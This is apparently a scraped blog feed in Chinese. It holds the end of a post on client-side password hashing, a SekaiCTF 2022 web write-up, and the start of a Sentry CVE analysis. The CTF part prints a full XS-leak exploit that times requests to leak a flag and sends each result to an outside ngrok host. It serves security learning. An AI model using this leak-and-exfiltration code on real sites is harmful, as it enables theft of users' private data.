&quot;ClientEphemeral&quot;:&quot;D013N7FXYHylqMeWa6ctJIv3J4uF1hqodyYfw6O+Sj7MZOIB+wksfgk&#x2F;nkXCmRxQhuSYwqwMJIpyFD3MEolOZAHMU2n6HQlxe9A4KbrE4gk3UiGwfgcZDmFejTmMMxfWhf4zO2Z1fBbohreqwwN0mz3AqqsfE5dsDh3LEfkiJB449YGZfHeUHyIzS1jTmnx&#x2F;8l6uVSKwJDCJelVFYKMXrxVt0ltcGRoYD92MUj82kR0am+BN4+djHyYYXuwuIYArnTW4kDP3T2yCIAMVgZnFaUCc2gfynt40mQP4q87jmMELOl8TDIDo5iKyH4gJc&#x2F;470qIuIyj4ffVLiZ7t8S+kcw&#x3D;&#x3D;&quot;, &quot;SRPSession&quot;:&quot;3fa6224285409b6af07c811971e05341&quot;, &quot;Username&quot;:&quot;test@test.com&quot;, &quot;Payload&quot;:&#123; &quot;qcA_CRYU6gSyHWdn&quot;:&quot;c6UZSKPo4Sfm&#x2F;3+DvQN72TTxyj+&#x2F;TplKT9edDiUI5wMfGUsoJs9FGerOtkoW8T49r7KOvqHkzS2+M2v8ra7J9l5kSf5jgC9ZvgZ8Ja5Xgg02nxgAABydOirGLoL4htFsYVtwLrNg8NeSEanLwYLCVaSqkjANRJks0eaKpUOd8xRhCFtUH&#x2F;GCbyg27oZfzDsqKXemKprOUsOh42NTqzEmruAkxs2x8mUsLy&#x2F;vXptVAdaiJLrsSRqD0YBGjvOp4W2&#x2F;0g6V2zfedJpJEzVwtSi1vXTC5bwxmEJlYdV9AiQECogAAJFxLQi7JjtmgFe4tNcv97JD0B8giZ6XS35swjz0vz0mOjVBUwmiDa8n54Y5kBaAoZe5pijdp2S4SOcRAknDIcD1nf0v7oSMOE9WtH&#x2F;sa+XI1D2s5lFKo&#x2F;iInf7r5R9src2hHFoy0b2XT0oCfLPwFX87yjaKbf7bbkjByx&#x2F;3dOgzEliAkS6nHK+fmeDDVM4EoZqVSKZHLg3QTcg4DKaICyDsotALr2UqI&#x2F;ARzkX4yhAXz5xHFaxl6hWAKLJPJcgk6il6oX0s0PCBNSY0Fi3vbQvXD4WalUx+LBNto6CUqeAIzVuAh8sCubzufoSORypE5WqfnuJzAlZ9sMEjaQycuRi497aV3jmjgx53UwO0OiZGxDTEMFBcov4P0g1blZ4vxmULhZU0RfdP31udLr6GTCAB90CM6Vk9w9CsYM+hmo3+JpEAtIVgLVVqcPikTbV+yaOJ1RknxBf3g06kTl0LQ+zBV6pG2rFVi8G4XT9L4FsIgxTNsl&#x2F;ryzs8vJU7K+HvyE1Lp2pAXrfcju7TAIqK&#x2F;FOXvp1c8Ay9O6d4fmd&#x2F;PZalnRDv5mQ6Gmd6JSNzNh6i6AibBuF13w3OBaulY3FGNU&#x2F;cH&#x2F;AXLBIqjSzf&#x2F;OySwkKkC9HBurSs3D0zqcH9BwUpmPEL8jbc8yPE+hPAim+tDo1BXCQNClxgGLaI6FXkuCiQ4AHiKsq0xs5b3WAFzcvBv1rc003RWxRegH&#x2F;2teIooKU9w1kDPQRaK8&#x2F;rIYe8u+BlBeZq4OwCXxx56JHfmTxtJwBi95KqsWzLGtY3ILcb+&#x2F;XkzSRmE2TWbkW1IXzRsl8F6NSJj7JnHA3UrQf4hxuwbaYxpKJrcHuHc8e1wxqXrUSKooCOUxwSBgxvLLT37eaByNTxpfWomxIsH671wuydnmMedWyNIqyaMtxBORuiWUiG4jbMC2BjrVptXJ7VWigf3Vy5OQlMOyTx8tLWi1qZODYyywMBAvHYQlFfSqmIrm4y4dmK&#x2F;srJE&#x2F;+daEnNS+kWF48Jm&#x2F;rQORO5AUwqWL+Lefg9pchcL1BnHOANcviO8pAkxLo8TiK7VLKI5&#x2F;xUsZQoQSlhRt27zMF+sIv+exY375HApiY+a1VQ6OqE4Nvba7O8ETLoLFg4a8Aj+W8erXFHW5F0vVIRphAve9orM4QYnAmOigFAiLb0Pxx124wUjFR9s5oP98hAtNL&#x2F;t+uGAXrb0oxiCfyHb9wa2Qb0x6o9FpuBIc5ZXId+cEXEvOdqhnUQ7ZuOi&#x2F;fX81hlqgUaiD&#x2F;A6P+zjAcREXdktd+hrhSXwCIKSBkp&#x2F;mNymnalQKJkLaNVT+W2sOWqXxTSTIytCQx36xABcj1BXRApntob6Qvche8QJLTjzr9bDpn+Mo59N9PSU51DPIj5Avre6ChTHEQvjz9s1IM2XroBX&#x2F;KFBnPj33aYQZyov4uxrVXxic+fiY+fLMF8x1ut&#x2F;eNWeQU6fn+rU5PEGQ9bbAsjVBZYA5H93ROhO5lnSxoEk5PHkgQ9WpxueckPjJIUGAs+O8QMRFicccfKjhNIc32rXTqbVqLyoz62riDn8Y18MUBoeI8ORyqZOKEEBFsi5dwqoq8t82NFdx5LFjsLdk4RmMXZ2uygNLk8gH2Yyfu3iOQS2bKtNCW42Xmo66Xu5kt8NwAneYQK0mTn6HUv94K10J4hY+Q&#x3D;&quot; &#125; &#125; 補充：經討論串有人提醒後發現這是一個叫做 SRP（Secure Remote Password）的協議，Proton 有提供一個 ProtonMail Security Features and Infrastructure，裡面有記錄他們的安全措施，就有講到這個機制。 看起來滿複雜要花不少時間研究，先放著，有興趣的可以參考：SRP—更健全的登入及資料傳輸保護協議 雖然更安全，但成本應該又更高了。 交易所與銀行看完上面案例發現有做的是少數，因此我好奇更注重安全的加密貨幣交易所與傳統銀行有沒有做。 BinanceAPI 網址：https://accounts.binance.com/bapi/accounts/v2/public/authcenter/login 請求內容： &#123; \"email\":\"test@test.com\", \"password\":\"fe2e6b4138fcd7f27a32bc9af557d69a\", \"safePassword\":\"d404559f602eab6fd602ac7680dacbfaadd13630335e951f097af3900e9de176b6db28512f2e000b9d04fba5133e8b1c6e8df59db3a8ab9d60be4b97cc9e81db\" &#125; CoinbaseAPI 網址：https://login.coinbase.com/api/v1/authenticate-credentials 請求內容： &#123;\"email\":\"test@test.com\", \"password\":\"1234\"&#125; krakenAPI 網址：https://www.kraken.com/api/internal/account/settings/tfa 請求內容： &#123;\"username\":\"test\", \"password\":\"1234\"&#125; 玉山銀行API 網址：https://ebank.esunbank.com.tw/fco/fco08001/FCO08001_Home.faces 請求內容： loginform:custid&#x3D;A0000... loginform:name&#x3D;mxagZmaqygDx0XX6784Svw&#x3D;&#x3D;__NgZQcFfAx+lQmPza2eNpOA&#x3D;&#x3D; loginform:pxsswd&#x3D;8,lIRnuUxw&#x2F;yStOt9QIYG2U3Gn2XkG03x4Ey&#x2F;UU6JGtsbUxfRXoAv9CjE3EWerDN3tfx3dD&#x2F;B3ChLAPMSG2BA3jMXUCZC06y8UbQ5isKc9fCWZSSZAWWcOmJ7LdXw1ZhjV55hpw1upvAr9WEmZ0XF6x7if+dBxJ4KZ00d83qA9eA+3VaSk+JLhN8&#x2F;CFBfTKTfJEs3PDNsm12XzRUBb4YE1aPQosVX10mdvh3zY5lmkrKuq8gnuImEf3oLOk4EF3eVpr6jJiFzMKlHybvGdtKYS25+pgTS68wn3v023barbSmgivcv5atm0XsyXWDY2dKEtdQz+7A6R+AB0bExbQlRjqQ&#x3D;&#x3D; 國泰世華API 網址：https://www.cathaybk.com.tw/MyBank/Quicklinks/Home/NormalSignin 請求內容： CustID&#x3D;A000... UserId&#x3D;DC0C6E52BE2A2354C53401207F220F1B Password&#x3D;8cf5e1977f149ed0362629007a7f91d0efc7b12cb1895ba701c528a12b38d12f8148ca03ee671fe25d2a3a807be980f7728566e359a675734ce046899b147658388bb60f9b900e2ccc9adac280b54b5f2e28cb7eee1b634d0e1ed1c0c0c598c350f61eb003405559331a7f047add7289466bf42cfd5b9e774a1fa116af4fd7050adb8f174d42a8e2098a014a788bd2ffae3bf4ff7a8d8d7e2e8068402fda395da41be6e5d32f2d32cbee2afc26e82c58b60357b5cb186a3b9cf69df2deb9da8c9fde45337935180cb4e177109413d7a758d38bfc8334a4509d8d8fb6a37080f0e0086b4a5ef68f7809ca2ef97183b7f66d996873bb7dbfcee61d2da424b8b968 中國信託API 網址：https://www.ctbcbank.com/IB/api/adapters/IB_Adapter/resource/preLogin 請求內容： &#123; &quot;rqData&quot;: &#123; &quot;custId&quot;: &quot;A00....&quot;, &quot;pin&quot;: &quot;878dbee38bbb4d77a30ee128f55f7bfe2169e45380d62a75453d3ca175e8ce8b|43d0499147b62adeec4eef3c77d33171b4569d0bdf7bbbe2b8b9bde3d30a26aba69aadfb28dfbaa9a997a0ccf668aaab0b6da582275175272172569a58a60bbfc5ac3a8c6862ce31f86247d7c1adf307e363c0f251fb88c4d39afa6ed0ca0a49e053f4f90000fa77b4e78beaead72ebdf52a13ecb4f20ae9a532947fad8156d5ec69d6763243364e71659079e469d1e01d0c384b0c71f4e9e524890227d82a51a340ef0b48638e05e347d75cb93d4a825a2bce6a90ef47f512351ee2d0d1ea17fb8afd521e427578603ea775191711f81d8dcb18e46b72daf3a49a60e50d12d3887e3bafab3758730f7fb0276373ebe1da01a03162ec8e73a202091a51b7f88d&quot;, &quot;userId&quot;: &quot;bfcdb9b2d6896a3bfb4a6542e8fb2689486d000b11bdc0c7bc336a6534aec74c|1b1a758bb26702bc0ac7cd660da2a72866f2cfdcf3668f2d39a5f8b006854f52a08f418b0a460b36374f95b7a310d73ea9994788698041f524ecd1f153448ab5d51f901a9a08ac2a9ee04c5c273ecb9d4ec1b6a62e9696c6126271e2f8c334fe17ce8b8538139363b90be75c1130cb251ec240bd26c920b52f5be9fc59094ce7d935d826242d69dc1ff7047a5abbf11d3c7de639a14bb10230912903cd948c05b3b3cb0cdb100f979640e291774e623a7109bde7b55bb8a6a373c0ca12820b072132ea61c845e60e26d09c7ee0fe23f7de286cbccb067a86fd1985c5b455f9ae46ce24dc8f52bcb05c205d6a462345162ae82c35e045bf3fd43a297c3edcfe17&quot; &#125; &#125; 美國銀行API 網址：https://m.globalcard.bankofamerica.com/pkmslogin.form 請求內容： username&#x3D;fcc63767-1a43-4cc6-8c3e-1346350b5274 password&#x3D;12345678 新加坡星展銀行API 網址：https://internet-banking.dbs.com.sg/IB/Welcome 請求內容： USER_LOGON_NAME&#x3D;test123 ENCRYPTED_PIN_BLOCK&#x3D;A8C48B7572A1A53C5A66E9B43365027C7FBF14BF461F480A46781E49648A8F70271A29C374F86FCD55A76ED17B2284B47C799B74475F29749D68631FF7E322177A21EEE8C41D8950638A2828C34A2653D7C9F69F5DA568E42D64CE89FCE8F024217B235835E6F8BC3C536F56361EDF459AFCE9A512BDBACAB2D25423209996C2E84A18EA8446685DAF9FAD4B1D6D8DF0F378EC27D9A81AD4D1A2B91BA3CFD838140A9BD48AD8D38D33B0093110BD1CA2C76F3DE4CBD969A9B0260DB890E9B1A99DC1193BFE9A1EDB3E56F71CB1CD8630558B242B040F733A4A40B2E17DE6DA03A58DEC8BB12DA87BB25971E2DBE5AF7AE6112266A3F9027B449BDF46D8DC0A1A 結論在隨機想到的 20 個網站中，有 7 個有在前端做加密或是 hash（我懶得看是哪個了，總之有做事就對了），名單是： Facebook Proton Binance 玉山銀行 國泰世華 中國信託 新加坡星展銀行 雖然說 35% 看起來很高，但那是因為銀行佔了大多數，一般網站則是很少實作這個機制。 寫到這邊，可以來下結論了。 第一個結論是：「在 client 端傳送密碼前先把密碼 hash，確實能夠增加安全性」 理由是做了以後，能夠達成以下事項： HTTPS 因為各種原因失效時，攻擊者無法取得明文密碼 在 Server 端，沒有任何人知道使用者的明文密碼 明文密碼不會因為人為失誤被記錄到 log 中 以上都是沒有在 client hash 時做不到的。 而第二個結論是：「確實有些大公司有做這個機制，但是非大多數，不過在銀行業似乎是主流」 這個結論上面有貼完整的資料了，一般的網站很少做這個機制，但還是有人做。 2023-12-01 補充：感謝 @game0416 於留言補充，台灣的銀行有做主要是因為法規的要求：金融機構辦理電子銀行業務安全控管作業基準 第三個結論是：「雖然從技術上來看能夠增加安全性，但實際上是否實作，仍然要考慮其他因素」 這因素就是我前面提過的「可能性」還有開頭我講先不談的「成本」。 若是真的比較安全，為什麼一般網站不會實作這個機制？ 或許是因為覺得 HTTPS 被攻破的可能性太低，低到可以忽略不計（我相信這是大多數留言的人覺得不需要做的理由，我也同意這點），也或許是成本太高，會增加程式碼複雜度；若是採用加密的方案，也會消耗更多運算的資源在加解密上面，這也是成本。 這就是我覺得應該講清楚的地方。 在前端先做 hash 或是加密，它確實是有優點的，不是多此一舉，也不是沒有意義，更不是讓系統變得更危險。 但這不代表每個系統都該實作這個機制，因為它帶來的效益或許沒有成本高，這個端看各個公司的考量。對大部分的公司來說，與其為了 HTTPS 失效這個極低的可能性去投入成本，不如把時間花在加強其他登入環節的安全性（例如說 2FA 啦，或是不同裝置登錄警告等等），帶來的效益會更高。 有些服務還會選擇把整包 request 都加密，而非只有密碼，這個又更安全但是成本又更高，而且 debug 很不方便。雖然說既然加密做在 client 端，攻擊者一定有辦法逆向這個機制，看出是怎麼做的，但這不代表這些機制沒幫助。 舉例來說，假設我有個搶票 App 不想讓別人知道 API 怎麼呼叫，於是就實作了一個超複雜的加解密機制，儘管高手還是可以做逆向工程，寫出一個搶票機器人，但這個機制增加了他的時間成本以及對技術的要求。 以技術上來說，就算理論上一定會被破解，這些機制還是有意義的，它的意義在於增加破解難度，加殼、混淆都是一樣的，不會因為「在 client 端的東西一定會被看穿」而不去做這些機制。 重點在於你想保護的商業邏輯的價值，有沒有高到你需要付出這些成本去做額外的安全機制。 很多人在討論這個問題的時候，沒有辦法把「單一問題」跟「最佳實踐」切開來看，總是在討論著「以成本來說，怎樣怎樣才是最好的」或是「為什麼不乾脆怎樣怎樣」，但技術選型從來都不是一刀切的事情，最好的方案通常成本也較高，如果真的沒有這麼多的資源怎麼辦？是不是就需要選擇次好且成本較低的方案？ 不是只有最佳實踐才叫做實踐，技術是需要進行妥協的。 舉個例子，把登入驗證機制都換成 Passkeys，成本可能是 50，增加的安全性是 90。 把原本明文傳輸的密碼先 hash，成本可能是 20，增加的安全性是 5。 儘管 Passkeys 的效益整體來說更高，但問題是有些公司可能現在就只有 20 個單位的資源。 我自己認為一位優秀的工程師不能只給得出最佳實踐，而是必須針對有限資源的狀況之下，給出各種不同的解法，因此這篇討論的問題不是毫無意義的。把這個問題整理過一輪之後，自然而然就會出現許多成本不同，效益也不同的解法。 有多少資源，就做多少事。不過話說回來，了解最佳實踐是什麼還是滿重要的，這樣你才能知道該做多少取捨。 最後，如果你需要一個條列式的簡單結論，會是： 無論如何，一定要先用 HTTPS 可以的話，能用 Passkeys 當然是最好，少掉傳統密碼的一些問題 如果你想要用很安全的方式驗證密碼，並且確保在 Server 端不會處理到明文密碼，請參考 SRP（Secure Remote Password）協定，或是留言裡面讀者 yoyo930021 提到的 OPAQUE 若是上述都沒有資源做的話，那在前端先把密碼 hash 後再傳送，確實能夠增加一點安全性，但同時還是會帶來額外成本 如果你是銀行或需要較高的安全性，再來考慮要不要做這個，否則極大多數的狀況下，你不需要這個機制就夠安全了，資源投入在其他地方的效益會更大 若是對這個結論有不同意見，或是有在文章中發現哪些邏輯錯誤或技術錯誤，歡迎留言指正與討論，感恩。 補充一下，這篇大多數從技術面來看，除此之外還可以從法遵面或是資安的實務經驗來看，但這些面向我就零經驗了。許願一下有相關經驗的人出來指點迷津，或許會有不同觀點。","link":"/2023/01/10/security-of-encrypt-or-hash-password-in-client-side/"},{"title":"SekaiCTF 2022 筆記與 concurrent limit","text":"上個假日隨意地玩了一下 SekaiCTF 2022，不得不說視覺風格滿讚的，看得出來花了滿多心思在這個上面，很有遊戲的感覺。 這次我只玩了兩題 web，其中一題 xsleak 的 safelist 拿了 first blood，另外一題沒解開，說實在有點可惜（當 justCatTheFish 解開的時候我想說是誰這麼猛，賽後發現原來是 terjanq lol） 這篇寫一下 safelist 跟 Obligatory Calc 的解法，如果想看其他 web 題，可以看 lebr0nli 的 blog：SekaiCTF 2022 Writeups 關鍵字： xsleak lazy loading image 6 concurrent request limit socket pool null origin null e.source 題目敘述： Safelist™ is a completely safe list site to hold all your important notes! I mean, look at all the security features we have, we must be safe! Source code: https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist 這題的功能滿簡單的，你可以新增跟刪除 note，然後因為是 client side 的題目，所以照慣例有個 admin bot，可以提供 URL 讓它去訪問。 這題的特別之處在於它設了一堆 headers，有些我看都沒看過： app.use((req, res, next) => &#123; res.locals.nonce = crypto.randomBytes(32).toString(\"hex\"); // Surely this will be enough to protect my website // Clueless res.setHeader(\"Content-Security-Policy\", ` default-src 'self'; script-src 'nonce-$&#123;res.locals.nonce&#125;' 'unsafe-inline'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; `.trim().replace(/\\s+/g, \" \")); res.setHeader(\"Cache-Control\", \"no-store\"); res.setHeader(\"X-Frame-Options\", \"DENY\"); res.setHeader(\"X-Content-Type-Options\", \"nosniff\"); res.setHeader(\"Referrer-Policy\", \"no-referrer\"); res.setHeader(\"Cross-Origin-Embedder-Policy\", \"require-corp\"); res.setHeader(\"Cross-Origin-Opener-Policy\", \"same-origin\"); res.setHeader(\"Cross-Origin-Resource-Policy\", \"same-origin\"); res.setHeader(\"Document-Policy\", \"force-load-at-top\"); if (!req.session.id) &#123; req.session.id = crypto.randomUUID(); &#125; if (!users.has(req.session.id)) &#123; users.set(req.session.id, &#123; list: [] &#125;); &#125; req.user = users.get(req.session.id); next(); &#125;); 其中 CO 系列的我以前有寫過，但這次真的嘗試才發現有些跟我理解的有點出入，例如說 Cross-Origin-Opener-Policy 我本來以為是「有這個設定的頁面在 window.open 的時候，被開啟的視窗不會有 opener」，後來發現應該是雙向的，就是「我從別的頁面去打開一個有設定的頁面，我也沒辦法 access 它」 Document-Policy 這個也滿酷的，force-load-at-top 查了一下應該是禁止 Scroll-to-text-fragment 跟 #abc 這種 anchor。 除此之外呢，note 的內容也會被 DOMPurify.sanitize() 過濾，碰到這種題目，基本上就是幾個方向： meta 可以用 style 可以用 針對 window 的 DOM clobbering 可以用（針對 document 的不行） img 可以用，可以拿來發 request 在一開始看程式碼的時候，很快就看到一個可疑的地方： app.post(\"/create\", (req, res) => &#123; let &#123; text &#125; = req.body; if (!text || typeof text !== \"string\") &#123; return res.end(\"Missing 'text' variable\") &#125; req.user.list.push(text.slice(0, 2048)); req.user.list.sort(); res.redirect(\"/\"); &#125;); 當你新增一個 note 的時候，整個 note 都會重新排序。 這題的 flag 格式有特別說明，是^SEKAI&#123;[a-z]+&#125;$，flag 的格式相對簡單。 而我們可以利用這個排序功能來新增一個「在 flag 前面」或是「在 flag 後面」的 note，藉此來做 xsleak。 我最初的想法是構造一個 payload，像這樣：[CHAR]&lt;canvas height=&quot;1200px&quot;&gt;&lt;/canvas&gt;&lt;div id=&quot;scroll&quot;&gt;&lt;/div&gt; 重點是要做到： 如果 [CHAR] 排在 flag 前面，那當你把 location 更新成 #scroll 的時候，沒事發生（因為 #scroll 不需要捲動就看得到） 如果 [CHAR] 排在 flag 後面，那當你把 location 更新成 #scroll 的時候，頁面就會 scroll 到指定的地方（因為需要捲動） 如果可以偵測這個 scroll 的行為，再加上找到符合的高度，就能知道 [CHAR] 是排在 flag 前面還後面，就可以知道 flag 的第 n 個字元。 舉例來說，如果 SEKAI&#123;x 不會 scroll，而 SEKAI&#123;y 會 scroll，就知道 flag 的第一個字一定是 x。 但問題是我沒找到方法偵測 scroll，xsleak wiki 上有個方法需要 iframe，但這題不行。而且光是你要更新 location 就做不到了，因為前面提過的 Cross-Origin-Opener-Policy，會讓你對開啟的 window 完全沒控制權，連關閉都做不到： var w = window.open('https://safelist.ctf.sekai.team/') setTimeout(() => &#123; w.location = 'https://safelist.ctf.sekai.team/#scroll' // not working // even w.close() not working &#125;, 200) 沒關係，我後來想到了一個別的方法。 Loading image在 xsleak 的題目中，lazy loading image 是滿常用的一招，而我想到的方法其實跟剛剛差不多，只是把 #scroll 那個元素換成 image。 目標一樣是找到正確的值，我們稱做 threshold 吧，可以達成像下面這樣的行為，如果 note 在 flag 前面，圖片會載入： 如果 note 在 flag 下面，因為 lazy loading 的關係圖片不會載入： note 的內容像是這樣：A&lt;br&gt;&lt;canvas height=&quot;1850px&quot;&gt;&lt;/canvas&gt;&lt;br&gt;&lt;img loading=lazy src=/?img&gt; 這邊 1850px 是在我自己瀏覽器上面測出來的值，至於遠端 admin bot 的話可以先在 local 跑一個 headless browser 起來，然後慢慢去調整去測試，我最後找到的值是 3350px。 接著，只要找到方法能偵測出圖片是否有載入，就能推測出 flag 的順序，進而一個字元一個字元 leak 出整個 flag。 一般常見的方式是 cache，但這題有特別設定 Cache-Control: no-store，所以沒辦法用 cache。 那 concurrent 的限制呢？在 HTTP 1.1 的狀況下，瀏覽器對於一個 host 同時最多只能開啟 6 個連線，所以如果我們載入很多圖片，接著在另一個頁面針對 request 計時，速度應該會慢很多，因為 connection 被 block 住。 但這招我試了一下發現沒效果，雖然說我確實載入很多圖片，但另外一邊我用 fetch 來測試，connection 並沒有被 block 住。 於是那時我想說這個限制應該是針對「每個頁面」，意思是說我在 a.com 頁面對 target.com 發送 request 時，確實只能同時開啟 6 個，但在 b.com 頁面又能同時 6 個，每個頁面是切開的。 但儘管 connection 沒有被瀏覽器 block 住也沒關係，因為 server 還是會受到影響。 server 很忙這題的 server 是跑在 Node.js，而 Node.js 是單執行緒的，意思是它同時只能處理一個 request，其他 request 會排隊。 因此在開發上我們會避免一些「同步且耗時」的工作，因為這會造成效能上的問題，例如說： app.get('/heavy', (req, res) => &#123; const result = heavyMathCalculation() res.send(result) &#125;) app.get('/hello', (req, res) => &#123; res.send('hello') &#125;) 當我發了一個 request 給 &#x2F;heavy，再發一個給 &#x2F;hello，在 heavyMathCalculation 跑完以前，我 &#x2F;hello 都不會收到 response。 雖然說在這題裡面並沒有這種耗時的工作，但如果我們發了一堆 request，那 server 還是需要時間處理，所以在 response 的時間上還是會有差。 總結一下，idea 大概是這樣： 建立一個開頭是 CHAR 的 note 不斷利用 fetch 去偵測 response time 如果 response time 小於 threshold，代表 CHAR 在 flag 後面，所以圖片沒載入 反之，代表 CHAR 在 flag 前面，因為圖片載入了拖慢 server 速度 目標是找到滿足以下條件的 CHAR time(CHAR)&gt;threshold &amp;&amp; time(CHAR+1)&lt;threshold 底下附上兩張截圖，第一個是 SEKAI&#123;z 的，fetch 的載入時間總共是 0.9 秒（30 個 request），速度相對較快代表圖片沒被載入： 這張是 SEKAI&#123;m 的，載入時間是 1.7s，明顯可以看出比 z 的多很多，因此第一個字元的範圍一定在 m ~ y 當中。 只要做變化版的二分搜，就可以快速找到是哪個字元，我最後的腳本如下（跑一次可以拿到一個字元）： https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45 &lt;!DOCTYPE html> &lt;html> &lt;!-- The basic idea is to create a post with a lot of images which send request to \"/\" to block server-side nodejs main thread. If images are loading, the request to \"/\" is slower, otherwise faster. By using a well-crafted height, we can let note with \"A\" load image but note with \"Z\" not load. We can use fetch to measure the request time. --> &lt;body> &lt;button onclick=\"run()\">start&lt;/button> &lt;form id=f action=\"http://localhost:1234/create\" method=\"POST\" target=\"_blank\"> &lt;input id=inp name=\"text\" value=\"\"> &lt;/form> &lt;form id=f2 action=\"http://localhost:1234/remove\" method=\"POST\" target=\"_blank\"> &lt;input id=inp2 name=\"index\" value=\"\"> &lt;/form> &lt;script> let flag = 'SEKAI&#123;' const TARGET = 'https://safelist.ctf.sekai.team' f.action = TARGET + '/create' f2.action = TARGET + '/remove' const sleep = ms => new Promise(r => setTimeout(r, ms)) const send = data => fetch('http://server.ngrok.io?d='+data) const charset = 'abcdefghijklmnopqrstuvwxyz'.split('') // start exploit let count = 0 setTimeout(async () => &#123; let L = 0 let R = charset.length - 1 while( (R-L)>3 ) &#123; let M = Math.floor((L + R) / 2) let c = charset[M] send('try_' + flag + c) const found = await testChar(flag + c) if (found) &#123; L = M &#125; else &#123; R = M - 1 &#125; &#125; // fallback to linear since I am not familiar with binary search lol for(let i=R; i>=L; i--) &#123; let c = charset[i] send('try_' + flag + c) const found = await testChar(flag + c) if (found) &#123; send('found: '+ flag+c) flag += c break &#125; &#125; &#125;, 0) async function testChar(str) &#123; return new Promise(resolve => &#123; /* For 3350, you need to test it on your local to get this number. The basic idea is, if your post starts with \"Z\", the image should not be loaded because it's under lazy loading threshold If starts with \"A\", the image should be loaded because it's in the threshold. */ inp.value = str + '&lt;br>&lt;canvas height=\"3350px\">&lt;/canvas>&lt;br>'+Array.from(&#123;length:20&#125;).map((_,i)=>`&lt;img loading=lazy src=/?$&#123;i&#125;>`).join('') f.submit() setTimeout(() => &#123; run(str, resolve) &#125;, 500) &#125;) &#125; async function run(str, resolve) &#123; // if the request is not enough, we can send more by opening more window for(let i=1; i&lt;=5;i++) &#123; window.open(TARGET) &#125; let t = 0 const round = 30 setTimeout(async () => &#123; for(let i=0; i&lt;round; i++) &#123; let s = performance.now() await fetch(TARGET + '/?test', &#123; mode: 'no-cors' &#125;).catch(err=>1) let end = performance.now() t += end - s console.log(end - s) &#125; const avg = t/round send(str + \",\" + t + \",\" + \"avg:\" + avg) /* I get this threshold(1000ms) by trying multiple times on remote admin bot for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold */ const isFound = (t >= 1000) if (isFound) &#123; inp2.value = \"0\" &#125; else &#123; inp2.value = \"1\" &#125; // remember to delete the post to not break our leak oracle f2.submit() setTimeout(() => &#123; resolve(isFound) &#125;, 200) &#125;, 200) &#125; &lt;/script> &lt;/body> &lt;/html> 賽後檢討賽後看到 terjanq 的解法，他用了 &lt;script&gt; 來做 timing，而我用 fetch，差別之處在於在它的狀況之下，&lt;script&gt;的載入被 block 了！ 底下我有錄兩個影片來表示差異： https://www.youtube.com/watch?v=ixyMZlIcnDI 用 script https://www.youtube.com/watch?v=15CJQ9nzrxs 用 fetch 可以看到在第一個狀況中，應該是「每個分頁都共用同一個限制」，意思是傳說中的「6 concurrent request」是針對目的地，而不是像我前面所認知的，每個頁面都有自己的 pool。 但是在第二個狀況中，看起來又不是這樣，也是我當初比賽時會誤解的原因。問了 terjanq 他回說可能是 partition key 的差別。 原本想在 Chromium 原始碼裡面找答案，發現功力太淺找不到，只找到大家都能找到的 socket pool per group: https://source.chromium.org/chromium/chromium/src/+/refs/tags/107.0.5261.1:net/socket/client_socket_pool_manager.cc;l=51 // Default to allow up to 6 connections per host. Experiment and tuning may // try other values (greater than 0). Too large may cause many problems, such // as home routers blocking the connections!?!? See http://crbug.com/12066. // // WebSocket connections are long-lived, and should be treated differently // than normal other connections. Use a limit of 255, so the limit for wss will // be the same as the limit for ws. Also note that Firefox uses a limit of 200. // See http://crbug.com/486800 int g_max_sockets_per_group[] = &#123; 6, // NORMAL_SOCKET_POOL 255 // WEBSOCKET_SOCKET_POOL &#125;; 沒找到當我呼叫 fetch 發送 request，跟我使用 &lt;script&gt; 發送 request，差別到底在哪裡。 但我後來還是做了一些實驗，我準備了三個 host： A: http://exp.test:1234B: http://example.comC: http://test.ngrok.io(target) 簡單來說，C 是目標，而 C 有一個 endpoint 三秒之後才會給 response，接著我分別用 AB 跟 AC 去做測試，看看不同狀況底下會發生什麼事 程式碼大概長這樣： &lt;body> &lt;button onclick=startFetch()>start fetch&lt;/button> &lt;button onclick=startScript()>start script&lt;/button> &lt;button onclick=startImg()>start img&lt;/button> &lt;/body> &lt;script> const round = 20 function startFetch() &#123; for(let i=0; i&lt;20; i++)&#123; fetch('http://test.ngrok.io/block?q='+i, &#123; mode: 'no-cors' &#125;) &#125; &#125; function startScript() &#123; for(let i=0; i&lt;20; i++)&#123; let el = document.createElement('script') el.src = 'http://test.ngrok.io/block?q='+i document.body.appendChild(el) &#125; &#125; function startImg() &#123; for(let i=0; i&lt;20; i++)&#123; let el = document.createElement('img') el.crossorigin='anonymous' el.src = 'http://test.ngrok.io/block?q='+i document.body.appendChild(el) &#125; &#125; &lt;/script> 舉例來說，當 A 用 fetch 抓 C 的資料，B 也用 fetch 抓 C 的資料，那先抓的會獲勝，後抓的就要乖乖排隊，代表兩個是共用同一個 connection pool。 而如果 A 用 fetch，B 用 img，兩者互不干擾，代表兩個用的是不同的 pool。 總之最後測出來的狀況是：「fetch 跟 script&#x2F;img 是兩個不同的 pool」。 接著我測 A 跟 C，C 代表的是自己抓自己的資料，這個的結果就比較神奇了。 如果我 A 用 fetch，C 也用 fetch，兩個互不干擾。 但若是我 A 用 img，C 用 fetch，C 的 fetch 會優先，A 的 img 需要排隊。 根據最後測的結果，我總結出一共有兩個 pool： 其他 host 對於 target host 的 fetch 自己對自己的 fetch &amp; script&#x2F;img 的載入 原本預期會是這些全部都共用一個 pool，但看起來其他 host 的 fetch 是額外一個 pool，雖然不知道原因為何就是了。 最後貼一下作者的 writeup：https://brycec.me/posts/sekaictf_2022_challenges 還沒仔細看，但跟全部 connection pool 的限制有關。 然後推一篇好文：从Chrome源码看浏览器如何加载资源 Obligatory Calc這題簡單寫一下解法就好： onmessage 裡面的 e.source 是發送訊息的來源 window，雖然乍看之下一定是物件，但如果 postMessage 之後立刻關閉，就會變成 null 在 sandbox iframe 底下，存取 document.cookie 會發生錯誤","link":"/2022/10/08/sekaictf2022-safelist-and-connection/"},{"title":"簡單分析 CVE-2023-46729：Sentry Next.js SDK 的 URL rewrite 漏洞","text":"Sentry 在 2023 年 11 月 9 號時，在部落格上發布了這篇文章：Next.js SDK Security Advisory - CVE-2023-46729，內容主要在講述 CVE-2023-46729 這個漏洞的一些細節，包含漏洞成因、發現時間以及修補時間等等。 雖然說是在 11&#x2F;9 正式對外發布漏洞公告，但漏洞其實在 10&#x2F;31 發佈的 7.77.0 版本已經修復了，有預留一些時間給開發者們來修補漏洞。 接著就來簡單講一下這個漏洞的成因以及攻擊方式。 漏洞分析在 GitHub 上面也有一個比較偏技術的說明：CVE-2023-46729: 